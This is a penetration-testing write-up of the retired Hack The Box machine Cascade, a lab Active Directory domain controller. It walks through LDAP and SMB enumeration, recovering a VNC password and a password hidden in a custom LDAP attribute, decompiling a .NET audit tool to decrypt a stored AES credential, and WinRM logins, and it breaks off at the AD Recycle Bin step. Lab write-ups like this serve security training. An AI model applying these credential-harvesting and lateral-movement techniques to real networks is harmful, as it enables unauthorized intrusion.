<p align="center">
  <img src="../assets/branding/nu11s3c-banner.svg" alt="nu11s3c security writeups" width="100%" />
</p>

# cascade - hack the box

**platform:** Hack The Box · retired machine  
**os:** Windows Server 2008 R2 SP1 · x64 (build 7601)  
**outcome:** WinRM access as `s.smith`, `ArkSvc` and Administrator  
**focus:** LDAP · SMB · TightVNC · .NET decompilation · AES · AD Recycle Bin · password reuse

---

## `00 / prep`

usual prep, fish for the environment variables and tmux for logging. keeping the scans and loot separate

```sh
❯ cat env.fish
# env.fish
set -gx ENGAGEMENT_DIR (pwd -P)
set -gx ENGAGEMENT "cascade"
set -gx IP "<TARGET_IP>"

if set -q TMUX
    set -l session (tmux display-message -p '#S')
    tmux set-environment -t "$session" ENGAGEMENT "$ENGAGEMENT"
    tmux set-environment -t "$session" IP "$IP"
    tmux set-environment -t "$session" ENGAGEMENT_DIR "$ENGAGEMENT_DIR"
end

CPTS/day10/cascade
❯ . env.fish

CPTS/day10/cascade
❯ tree
.
├── env.fish
├── logs
│   └── tmux
│       └── s0-p0-20261126T145430-ZmVRBf.log
├── loot
├── notes
│   └── notes.md
└── scans

6 directories, 3 files
```

<br>

---

## `01 / recon`

### service discovery

started with the standard scans

```sh
❯ nmap -sVC -oA scans/initial $IP
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-27 07:16 -0500
Nmap scan report for <TARGET_IP>
Host is up (0.056s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-27 12:16:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-11-27T12:17:04
|_  start_date: 2026-11-26T18:10:00
|_clock-skew: -33s
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.78 seconds
```

DNS, Kerberos, LDAP and the global catalog, clearly a DC. also have 5985 open, which is worth keeping in mind if I come across creds later. 5985 is WinRM

```sh
❯ nmap -p- --min-rate 1000 -oA scans/allports $IP
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-27 07:25 -0500
Nmap scan report for <TARGET_IP>
Host is up (0.044s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 114.73 seconds
```

nothing else from the full TCP scan. checked UDP as well, particularly interested in DNS

```sh
CPTS/day10/cascade took 1m54s
❯ nmap -sUV --top-ports 100 -oA scans/udp $IP
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-27 07:37 -0500
Nmap scan report for <TARGET_IP>
Host is up (0.045s latency).
Not shown: 98 open|filtered udp ports (no-response)
PORT    STATE SERVICE VERSION
53/udp  open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
123/udp open  ntp     NTP v3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 528.72 seconds
```

<br>

### dns

added the domain to hosts and tried a couple of queries. was hoping to get more information about the domain before going into LDAP

```sh
❯ echo "$IP    cascade.local" | sudo tee -a /etc/hosts
<TARGET_IP>    cascade.local
```

```sh
❯ dig @$IP cascade.local ANY

; \<<>> DiG 9.20.30-1-Debian \<<>> @<TARGET_IP> cascade.local ANY
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER\<<- opcode: QUERY, status: FORMERR, id: 45519
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: [COOKIE_REDACTED] (echoed)
;; QUESTION SECTION:
;cascade.local.			IN	ANY

;; Query time: 47 msec
;; SERVER: <TARGET_IP>#53(<TARGET_IP>) (TCP)
;; WHEN: Fri Nov 27 07:59:19 EST 2026
;; MSG SIZE  rcvd: 54
```

```sh
❯ dig @$IP cascade.local AXFR

; \<<>> DiG 9.20.30-1-Debian \<<>> @<TARGET_IP> cascade.local AXFR
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

no luck with the zone transfer

<br>

### ldap

queried rootDSE anonymously first. want the base DN so I know where to start searching the directory. rootDSE being readable doesn't necessarily mean I can read the actual user objects

```sh
❯ ldapsearch -x -H ldap://$IP -s base -b "" | tee scans/ldap-root.txt
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
currentTime: 20261127132101.0Z
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cascade,DC=local
dsServiceName: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
defaultNamingContext: DC=cascade,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=cascade,DC=local
configurationNamingContext: CN=Configuration,DC=cascade,DC=local
rootDomainNamingContext: DC=cascade,DC=local
<--snip-->
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
dnsHostName: CASC-DC1.cascade.local
ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL
serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Conf
 iguration,DC=cascade,DC=local
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
isSynchronized: TRUE
isGlobalCatalogReady: TRUE
domainFunctionality: 4
forestFunctionality: 4
domainControllerFunctionality: 4

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

used the defaultNamingContext to search the domain for users and saved the results. wanted to see the attributes on the accounts

```sh
❯ ldapsearch -x -H ldap://$IP -b "DC=cascade,DC=local" -s sub "(objectClass=user)" > scans/ldap-user.txt

❯ batcat scans/ldap-user.txt | grep -A 25 "Ryan Thompson"
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: [SID_REDACTED]
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: [BASE64_REDACTED]
```

r.thompson is a member of IT, also has a rather interesting custom attribute, cascadeLegacyPwd. looks like base64

```sh
❯ echo "[BASE64_REDACTED]" | base64 -d
[R_THOMPSON_PASSWORD]
```


<br>

---

## `02 / authenticated enumeration`

### rpc and smb

ran enum4linux-ng with the creds. wanted to get a better picture of the domain, the groups and the shares available to this user. useful to check the password policy while I'm here too

```sh
❯ enum4linux-ng -A -u r.thompson -p [R_THOMPSON_PASSWORD] -oA scans/enum4linux-ng.txt $IP
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... <TARGET_IP>
[*] Username ......... 'r.thompson'
[*] Random Username .. 'zplqvjxq'
[*] Password ......... '[R_THOMPSON_PASSWORD]'
[*] Timeout .......... 10 second(s)
<--snip-->
```

```text
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for password authentication
[+] Server allows authentication via username 'r.thompson' and password '[R_THOMPSON_PASSWORD]'
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
```

creds worked. enum4linux also enumerated users and groups. looking through the groups, a few of the custom ones stood out

```text
'1119':
  groupname: AD Recycle Bin
  type: local
'1120':
  groupname: Backup
  type: local
'1123':
  groupname: Temps
  type: local
'1125':
  groupname: WinRMRemoteWMIUsers__
  type: local
'1126':
  groupname: Remote Management Users
  type: local
'1132':
  groupname: Factory
  type: local
'1133':
  groupname: Finance
  type: local
'1137':
  groupname: Audit Share
  type: local
'1138':
  groupname: Data Share
  type: local
```

AD Recycle Bin and Audit Share in particular, not sure if they'll be useful yet

```text
[*] Testing share Audit$
[+] Mapping: OK, Listing: DENIED
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Data
[+] Mapping: OK, Listing: OK
```

I can list the contents of Data, but not Audit$. 

```text
Domain password information:
  Password history length: None
  Minimum password length: 5
  Minimum password age: none
  Maximum password age: not set
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
```

pretty weak password policy

checked the shares again with smbmap

```sh
❯ smbmap -u r.thompson -p [R_THOMPSON_PASSWORD] -H $IP
<--snip-->
[+] IP: <TARGET_IP>:445	Name: cascade.local       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	Audit$                                            	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY	
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	print$                                            	READ ONLY	Printer Drivers
```

Data looks interesting

<br>

### data share

r.thompson is in IT so started looking through the IT directory for old configs, scripts, backups etc

```sh
❯ smbclient //$IP/data -U 'r.thompson%[R_THOMPSON_PASSWORD]'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

		6553343 blocks of size 4096. 1618712 blocks available
```

```sh
smb: \IT\Email Archives\> ls
  .                                   D        0  Tue Jan 28 13:00:30 2020
  ..                                  D        0  Tue Jan 28 13:00:30 2020
  Meeting_Notes_June_2018.html       An     2522  Tue Jan 28 13:00:12 2020

		6553343 blocks of size 4096. 1618710 blocks available
smb: \IT\Email Archives\> get Meeting_Notes_June_2018.html
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (12.9 KiloBytes/sec) (average 12.9 KiloBytes/sec)
```

```sh
smb: \IT\Temp\s.smith\> get "VNC Install.reg"
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (14.2 KiloBytes/sec) (average 13.5 KiloBytes/sec)
```

<br>

### tightvnc

a registry export from a VNC installation in another user's directory, definitely want to look at that

```sh
❯ cat VNC\ Install.reg
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
<--snip-->
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:[VNC_CIPHERTEXT_REDACTED]
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
<--snip-->
```

the Password value is a hex representation of the stored VNC credential. TightVNC encryption for this, not a one-way password hash. recovered the password from that value. no VNC port showed up in the scans, maybe the password was reused

<br>

### meeting notes

also read the meeting notes I'd downloaded

```sh
❯ cat Meeting_Notes_June_2018.html
<html>
<body lang=EN-GB link=blue vlink=purple style='tab-interval:36.0pt'>
<--snip-->
```

```html
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
```

made a note of TempAdmin, especially the part about the password being the same as the normal admin account

<br>

---

## `03 / initial access`

### s.smith

tested the recovered VNC password with WinRM as s.smith

```sh
❯ evil-winrm -i $IP -u s.smith -p [S_SMITH_PASSWORD]

Evil-WinRM shell v4.1

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

password reuse, now have a shell. checked the account to see what access I had

```sh
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User\'s comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 7:58:05 PM
Password expires             Never
Password changeable          1/28/2020 7:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/28/2020 11:26:39 PM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.****
```

Audit Share and Remote Management Users, explains the WinRM access. also has a logon script called MapAuditDrive.vbs. was curious whether the script did anything interesting or just mapped a share

```sh
*Evil-WinRM* PS C:\Users\s.smith\Desktop> gci C:\ -r -fi MapAuditDrive.vbs -ea 0


    Directory: C:\Windows\SYSVOL\domain\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/15/2020   9:50 PM            258 MapAuditDrive.vbs


    Directory: C:\Windows\SYSVOL\sysvol\cascade.local\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/15/2020   9:50 PM            258 MapAuditDrive.vbs
```

```sh
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type c:\windows\sysvol\sysvol\cascade.local\scripts\mapauditdrive.vbs
\'MapAuditDrive.vbs
Option Explicit
Dim oNetwork, strDriveLetter, strRemotePath
strDriveLetter = "F:"
strRemotePath = "\\CASC-DC1\Audit$"
Set oNetwork = CreateObject("WScript.Network")
oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
WScript.Quit
```

just maps Audit$ to F:. wasn't able to read that share earlier as r.thompson, so checked again with the new creds

```sh
❯ nxc smb "$IP" -u "s.smith" -p '[S_SMITH_PASSWORD]' -d 'cascade' --shares
SMB         <TARGET_IP>   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <TARGET_IP>   445    CASC-DC1         [+] cascade\s.smith:[S_SMITH_PASSWORD]
SMB         <TARGET_IP>   445    CASC-DC1         [*] Enumerated shares
SMB         <TARGET_IP>   445    CASC-DC1         Share           Permissions     Remark
SMB         <TARGET_IP>   445    CASC-DC1         -----           -----------     ------
SMB         <TARGET_IP>   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         <TARGET_IP>   445    CASC-DC1         Audit$          READ
SMB         <TARGET_IP>   445    CASC-DC1         C$                              Default share
SMB         <TARGET_IP>   445    CASC-DC1         Data            READ
SMB         <TARGET_IP>   445    CASC-DC1         IPC$                            Remote IPC
SMB         <TARGET_IP>   445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         <TARGET_IP>   445    CASC-DC1         print$          READ            Printer Drivers
SMB         <TARGET_IP>   445    CASC-DC1         SYSVOL          READ            Logon server share
```

now have read access. used nxc to spider the share so I could get an idea of what was in there without walking each directory manually

```sh
❯ nxc smb "$IP" -u "s.smith" -p '[S_SMITH_PASSWORD]' -d 'cascade' --spider 'Audit$' --pattern ''
SMB         <TARGET_IP>   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <TARGET_IP>   445    CASC-DC1         [+] cascade\s.smith:[S_SMITH_PASSWORD]
SMB         <TARGET_IP>   445    CASC-DC1         [*] Spidering .
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/.. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/CascAudit.exe [lastm:'2020-01-28 16:47' size:13312]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/CascCrypto.dll [lastm:'2020-01-29 13:01' size:12288]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/DB [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/RunAudit.bat [lastm:'2020-01-28 18:29' size:45]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/System.Data.SQLite.dll [lastm:'2020-01-28 15:42' size:363520]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/System.Data.SQLite.EF6.dll [lastm:'2020-01-28 15:42' size:186880]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x64 [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x86 [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/DB/. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/DB/.. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/DB/Audit.db [lastm:'2020-01-28 16:43' size:24576]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x64/. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x64/.. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x64/SQLite.Interop.dll [lastm:'2020-01-28 15:42' size:1639936]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x86/. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x86/.. [dir]
SMB         <TARGET_IP>   445    CASC-DC1         //<TARGET_IP>/Audit$/x86/SQLite.Interop.dll [lastm:'2020-01-28 15:42' size:1246720]
```

<br>

---

## `04 / audit application`

### database

an audit application, crypto dll and a SQLite database. went for the database first, wanted to see what the app was storing before spending time looking through the binaries

```sh
❯ smbclient "//$IP/Audit\$" -U 'cascade/s.smith%[S_SMITH_PASSWORD]' -c 'get /DB/Audit.db Audit.db'
getting file \DB\Audit.db of size 24576 as Audit.db (76.7 KiloBytes/sec) (average 76.7 KiloBytes/sec)
```

```sh
sqlite> select * from deleteduseraudit
   ...> ;
╭──┬─────────┬────────────────────────────────────────┬─────────────────────────────────────────╮
│Id│Username │                  Name                  │            DistinguishedName            │
╞══╪═════════╪════════════════════════════════════════╪═════════════════════════════════════════╡
│ 6│test     │Test                                    │CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-   │
│  │         │DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d│817b9e1b0e6d,CN=Deleted                  │
│  │         │                                        │Objects,DC=cascade,DC=local              │
├──┼─────────┼────────────────────────────────────────┼─────────────────────────────────────────┤
│ 7│deleted  │deleted guy                             │CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0- │
│  │         │DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef│9d3e-28468d12deef,CN=Deleted             │
│  │         │                                        │Objects,DC=cascade,DC=local              │
├──┼─────────┼────────────────────────────────────────┼─────────────────────────────────────────┤
│ 9│TempAdmin│TempAdmin                               │CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-   │
│  │         │DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a│b07a-75a57f4c188a,CN=Deleted             │
│  │         │                                        │Objects,DC=cascade,DC=local              │
╰──┴─────────┴────────────────────────────────────────┴─────────────────────────────────────────╯
```

there's TempAdmin again. looks like the audit application kept a record of deleted users. also looked at the LDAP table

```sh
sqlite> select * from ldap;
╭────┬────────┬──────────────────────────┬───────────────╮
│ Id │ uname  │           pwd            │    domain     │
╞════╪════════╪══════════════════════════╪═══════════════╡
│  1 │ ArkSvc │ [CIPHERTEXT_REDACTED] │ cascade.local │
╰────┴────────┴──────────────────────────┴───────────────╯
```

ArkSvc and what looks like another encoded password. given the crypto dll sitting beside the exe I suspect there's a bit more to this one than base64

<br>

### decompilation

downloaded the application and its crypto library

```sh
day10/cascade/loot
❯ smbclient "//$IP/Audit\$" -U 'cascade/s.smith%[S_SMITH_PASSWORD]' -c 'get CascAudit.exe CascAudit.exe'
getting file \CascAudit.exe of size 13312 as CascAudit.exe (47.1 KiloBytes/sec) (average 47.1 KiloBytes/sec)

day10/cascade/loot
❯ smbclient "//$IP/Audit\$" -U 'cascade/s.smith%[S_SMITH_PASSWORD]' -c 'get CascCrypto.dll CascCrypto.dll'
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (44.9 KiloBytes/sec) (average 44.9 KiloBytes/sec)
```

used ilspycmd to look at the .NET code. interested in how CascAudit is using the database, specifically what happens to the Pwd field before it actually uses the password

```sh
❯ wget https://github.com/taozhiyu/ILSpy-Binaries/releases/download/v11.2/ilspycmd-v11.2-linux-x64.zip && \
  unzip ilspycmd-v11.2-linux-x64.zip -d ilspycmd
```

```sh
day10/cascade/loot
❯ /tmp/ilspy/ilspycmd/ilspycmd CascAudit.exe -o decompiled
```

```sh
cascade/loot/decompiled took 3m20s
❯ batcat CascAudit.decompiled.cs
<--snip-->

 val.Open();
 289 │                     SQLiteCommand val2 = new SQLiteCommand("SELECT * FROM LDAP", val);
 290 │                     try
 291 │                     {
 292 │                         SQLiteDataReader val3 = val2.ExecuteReader();
 293 │                         try
 294 │                         {
 295 │                             val3.Read();
 296 │                             text = Conversions.ToString(val3["Uname"]);
 297 │                             text2 = Conversions.ToString(val3["Domain"]);
 298 │                             string encryptedString = Conversions.ToString(val3["Pwd"]);
 299 │                             try
 300 │                             {
 301 │                                 password = Crypto.DecryptString(encryptedString, "[KEY_REDACTED]");
 302 │                             }
 303 │                             catch (Exception ex)
 304 │                             {
 305 │                                 ProjectData.SetProjectError(ex);
 306 │                                 Exception ex2 = ex;
 307 │                                 Console.WriteLine("Error decrypting password: " + ex2.Mess
     │ age);
 308 │                                 ProjectData.ClearProjectError();
 309 │                                 return;
```

there it is, the app passes the encrypted password and a hardcoded key into Crypto.DecryptString. still need to look at the DLL to understand the rest of the decryption. knowing the key doesn't tell me what cipher, mode or IV it uses

```sh
cascade/loot/decompiled
❯ batcat CascCrypto.decompiled.cs -p

<--snip-->

namespace CascCrypto

{

public class Crypto

{

public const string DefaultIV = "[IV_REDACTED]";

public const int Keysize = 128;

<--snip-->
public static string DecryptString(string EncryptedString, string Key)

{

byte[] array = Convert.FromBase64String(EncryptedString);

Aes aes = Aes.Create();

aes.KeySize = 128;

aes.BlockSize = 128;

aes.IV = Encoding.UTF8.GetBytes("[IV_REDACTED]");

aes.Mode = CipherMode.CBC;

aes.Key = Encoding.UTF8.GetBytes(Key);

using MemoryStream stream = new MemoryStream(array);

using CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read);

byte[] array2 = new byte[checked(array.Length - 1 + 1)];

cryptoStream.Read(array2, 0, array2.Length);

return Encoding.UTF8.GetString(array2);

}

}

}
```

AES-128-CBC, a hardcoded IV, UTF-8 bytes for the key and IV, and the ciphertext is base64 encoded. .NET uses PKCS7 padding by default

put together a little python script to reproduce the decryption locally

```sh
❯ cat decrypt.py
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

ciphertext = base64.b64decode("[CIPHERTEXT_REDACTED]")
key = b"[KEY_REDACTED]"
iv = b"[IV_REDACTED]"

cipher = AES.new(key, AES.MODE_CBC, iv)

plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

print(plaintext.decode())
```

```sh
CPTS/day10/cascade via 🐍 v3.14.10 took 47s
❯ python3 decrypt.py
[ARKSVC_PASSWORD]
```

had creds for ArkSvc. wanted to see whether this service account also had WinRM access

```sh
CPTS/day10/cascade via 🐍 v3.14.10
❯ evil-winrm -i $IP -u ArkSvc -p [ARKSVC_PASSWORD]

Evil-WinRM shell v4.1

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

<br>

---

## `05 / privilege escalation`

### ad recycle bin

first checked the groups on the new account. different account, different access, no point assuming the permissions are the same as s.smith

```sh
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-[DOMAIN_SID_REDACTED]-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-[DOMAIN_SID_REDACTED]-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-[DOMAIN_SID_REDACTED]-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-[DOMAIN_SID_REDACTED]-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-**8448**
```

AD Recycle Bin, that was one of the custom groups from the initial enumeration. also have that email about TempAdmin and the record in the database

checked that the AD PowerShell module was available and looked at the group itself

```sh
